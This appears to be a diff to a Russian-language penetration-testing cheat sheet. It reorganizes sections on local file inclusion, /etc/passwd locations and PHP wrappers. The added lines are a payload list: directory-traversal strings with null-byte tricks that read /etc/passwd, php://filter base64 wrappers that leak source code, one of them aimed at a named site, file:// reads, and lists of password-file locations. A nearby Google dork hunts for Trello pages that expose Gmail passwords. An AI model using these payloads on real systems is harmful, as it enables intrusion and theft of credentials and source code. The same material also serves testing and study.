@@ -324,25 +324,6 @@ Disallow - Запрет доступа всех роботов
 Allow - Разрешает доступ к определенной части ресурса
 ```
 
-**LFI**
-```
-/index.php?file=/../../../../../../../../../etc/passwd 
-
-=../../../../../../../../../../../../../etc/passwd%00 
-
-/anysome/vip/css/..\..\..\..\..\..\..\..\..\etc\passwd 
-
-file=/../../../../../../etc/passwd.php%00 
-
-file=/../../../../../../etc/passwd%00.php 
-
-index.txt при условии, что приписывается окончание .php 
-index.txt/././././../...«(100-10)/2 раз».../././ 
-
-php://filter/convert.base64-encode/resource=index 
-http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
-```
-
 **google dork**
 ```
 «site:trello.com AND intext:@gmail\.com AND intext:password»
@@ -381,8 +362,24 @@ http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 3. and just simply open that..
 ```
 
-**etc/passwd**
+**LFI**
 ```
+/index.php?file=/../../../../../../../../../etc/passwd 
+
+=../../../../../../../../../../../../../etc/passwd%00 
+
+/anysome/vip/css/..\..\..\..\..\..\..\..\..\etc\passwd 
+
+file=/../../../../../../etc/passwd.php%00 
+
+file=/../../../../../../etc/passwd%00.php 
+
+index.txt при условии, что приписывается окончание .php 
+index.txt/././././../...«(100-10)/2 раз».../././ 
+
+php://filter/convert.base64-encode/resource=index 
+http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+
 Поиск файла с паролями в следующих местах:
 ■ /etc/security/passwd
 ■ /tcb/auth/files/
@@ -402,7 +399,9 @@ http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 ../../../../../../../../../../../etc/passwd%00 ;(etc/rc, etc/rc.local, etc/ssh/ssh_config)
 ../../../../../../../../../../../etc/hosts ;(proc/cpuinfo, proc/meminfo)
 
+```
 **php wrappers:**
+```
 index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 page=php://filter/convert.base64-encode/resource=index.php
 page=file:///hidden_code.txt
